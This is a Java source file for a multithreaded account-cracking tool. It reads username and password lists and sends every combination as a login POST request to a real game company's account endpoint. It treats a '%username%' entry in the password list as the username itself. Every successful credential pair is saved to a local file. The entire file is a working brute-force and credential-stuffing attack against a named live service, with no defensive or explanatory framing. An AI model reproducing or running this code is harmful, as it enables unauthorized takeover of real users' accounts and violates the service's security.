import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;

public final class AccountCracker {

	static List<String> usernames;
	static List<String> passwords;
	static BufferedWriter writer;
		
	public static void main(String[] args) throws IOException {
		usernames = Files.readAllLines(Paths.get("usernames.txt"));
		passwords = Files.readAllLines(Paths.get("passwords.txt"));
		writer = new BufferedWriter(new FileWriter("accounts.txt", true));
		
		final int START = 65000;
		final int END = 75000;
		final int PER_THREAD = 2500;
		for (int i = START; i < END; i += PER_THREAD) {
			System.out.println("working from " + i + " to " + (i + PER_THREAD));
			new Thread(new AccountCrackerWorker(i, i + PER_THREAD)).start();
		}
	}

	static class AccountCrackerWorker implements Runnable {

		final int start, end;
		
		public AccountCrackerWorker(final int start, final int end) {
			this.start = start;
			this.end = end;
		}
		
		@Override
		public void run() {
			for (int i = start; i < end; i++) {
				for (String password : passwords) {
					if (password.equals("%username%")) {
						password = usernames.get(i);
					}
					System.out.println(i + ":" + usernames.get(i) + ":" + password);
					try {
						final String encodedData = "txtUsername=" + usernames.get(i) + "&txtPassword=" + password;
						final URL url = new URL("https://account.hirezstudios.com/response/login-response.aspx");
						final HttpURLConnection conn = (HttpURLConnection) url.openConnection();
						conn.setDoOutput(true);
						conn.setRequestMethod("POST");
						conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
						conn.setRequestProperty("Content-Length", String.valueOf(encodedData.length()));
						conn.getOutputStream().write(encodedData.getBytes());
						if (new BufferedReader(new InputStreamReader(conn.getInputStream())).readLine().split("|")[0].equals("0")) {
							writer.write(usernames.get(i) + ":" + password);
							writer.newLine();
							writer.flush();
							break;
						}
					} catch (final IOException e) {
						e.printStackTrace();
					}
				}
			}
		}
		
	}
}
